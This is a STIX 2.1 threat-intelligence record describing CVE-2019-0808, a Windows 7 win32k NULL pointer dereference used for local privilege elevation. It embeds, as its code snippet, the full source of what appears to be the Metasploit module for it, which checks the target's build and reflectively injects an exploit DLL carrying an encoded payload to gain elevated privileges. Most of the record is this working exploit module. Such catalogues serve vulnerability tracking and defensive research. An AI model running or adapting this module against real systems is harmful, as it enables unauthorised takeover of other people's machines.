{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ad17aae4-1721-49e1-8287-c9336569cab2",
    "created": "2024-08-14T16:49:25.856285Z",
    "modified": "2024-08-14T16:49:25.856289Z",
    "name": "Microsoft Windows NtUserMNDragOver Local Privilege Elevation",
    "description": " This module exploits a NULL pointer dereference vulnerability in MNGetpItemFromIndex(), which is reachable via a NtUserMNDragOver() system call.  The NULL pointer dereference occurs because the xxxMNFindWindowFromPoint() function does not effectively check the validity of the tagPOPUPMENU objects it processes before passing them on to MNGetpItemFromIndex() where the NULL pointer dereference will occur.  This module has been tested against Windows 7 x86 SP0 and SP1. Offsets within the solution may need to be adjusted to work with other versions of Windows, such as Windows Server 2008.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ntusermndragover.rb",
            "external_id": "ntusermndragover.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-0808"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/exodusintel/CVE-2019-0808"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/ze0r/cve-2019-0808-poc"
        },
        {
            "source_name": "reference",
            "url": "http://blogs.360.cn/post/RootCause_CVE-2019-0808_EN.html"
        },
        {
            "source_name": "reference",
            "url": "https://blog.exodusintel.com/2019/05/17/windows-within-windows/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::FileInfo\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::ReflectiveDLLInjection\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft Windows NtUserMNDragOver Local Privilege Elevation',\n        'Description' => %q{\n          This module exploits a NULL pointer dereference vulnerability in\n          MNGetpItemFromIndex(), which is reachable via a NtUserMNDragOver() system call.\n\n          The NULL pointer dereference occurs because the xxxMNFindWindowFromPoint()\n          function does not effectively check the validity of the tagPOPUPMENU\n          objects it processes before passing them on to MNGetpItemFromIndex(),\n          where the NULL pointer dereference will occur.\n\n          This module has been tested against Windows 7 x86 SP0 and SP1. Offsets\n          within the solution may need to be adjusted to work with other versions\n          of Windows, such as Windows Server 2008.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Cl\u00e9ment Lecigne', # discovery\n          'Grant Willcox', # exploit\n          'timwr' # msf module\n        ],\n        'Platform' => 'win',\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [\n          ['Windows 7 x86', { 'Arch' => ARCH_X86 }]\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_OS_RESTARTS],\n          'SideEffects' => [SCREEN_EFFECTS],\n          'Reliability' => [REPEATABLE_SESSION]\n        },\n        'References' => [\n          ['CVE', '2019-0808'],\n          ['URL', 'https://github.com/exodusintel/CVE-2019-0808'],\n          ['URL', 'https://github.com/ze0r/cve-2019-0808-poc'],\n          ['URL', 'http://blogs.360.cn/post/RootCause_CVE-2019-0808_EN.html'],\n          ['URL', 'https://blog.exodusintel.com/2019/05/17/windows-within-windows/'],\n        ],\n        'DisclosureDate' => '2019-03-12',\n        'DefaultTarget' => 0\n      )\n    )\n  end\n\n  def check\n    if session.platform != 'windows'\n      # Non-Windows systems are definitely not affected.\n      return CheckCode::Safe\n    end\n\n    version = get_version_info\n\n    vprint_status(\"OS version: #{version}\")\n    # see https://docs.microsoft.com/en-us/windows/release-information/\n    unless version.build_number.between?(Msf::WindowsVersion::Win7_SP0, Msf::WindowsVersion::Win7_SP1) && version.workstation?\n      print_error('The exploit only supports Windows 7 versions 7600 and 7601')\n      return CheckCode::Safe\n    end\n\n    path = expand_path('%WINDIR%\\\\system32\\\\win32k.sys')\n    _major, _minor, _build, revision, _brand = file_version(path)\n    return CheckCode::Safe if revision >= 24387\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    if sysinfo['Architecture'] != ARCH_X86\n      fail_with(Failure::NoTarget, 'Running against 64-bit systems is not supported')\n    end\n\n    # invoke the exploit, passing in the address of the payload that\n    # we want invoked on successful exploitation.\n    print_status('Reflectively injecting the exploit DLL and running the exploit...')\n    encoded_payload = payload.encoded\n    execute_dll(\n      ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2019-0808', 'exploit.dll'),\n      [encoded_payload.length].pack('I<') + encoded_payload\n    )\n\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-03-12",
    "x_mitre_platforms": [
        "win'"
    ]
}